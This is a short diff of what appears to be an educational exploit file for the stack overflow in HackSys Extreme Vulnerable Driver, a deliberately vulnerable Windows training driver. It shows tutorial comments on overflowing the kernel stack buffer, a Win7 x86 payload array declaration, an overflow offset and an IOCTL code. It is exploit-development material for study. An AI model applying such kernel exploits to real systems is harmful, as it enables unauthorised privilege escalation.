@@ -51,7 +51,6 @@ in the secure version the size is limited to the size of the kernel buffer.
 If we call this driver function and pass it a buffer which is larger
 than the kernel buffer we should get some kind of exploit primitive!
 '''
-B33F
 
 <-----------------
 To Put it simply The buffer gets allocated onto the stack, giving the attacker the opportunity,
@@ -78,8 +77,6 @@ unsigned char win7x86pl[] = {
 #define offset 2080 
 
 #define ioctl CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_NEITHER, FILE_ANY_ACCESS)
-
-const char kDevName[] = "\\\\.\\HackSysExtremeVulnerableDriver";
 
 int main()
 {
